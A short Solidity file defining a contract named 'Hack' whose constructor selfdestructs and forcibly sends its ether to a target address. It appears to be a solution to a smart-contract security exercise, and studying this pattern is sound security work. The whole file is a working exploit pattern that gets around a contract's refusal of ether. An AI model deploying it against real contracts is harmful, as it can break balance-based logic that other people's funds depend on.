pragma solidity ^0.8;

contract Hack {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}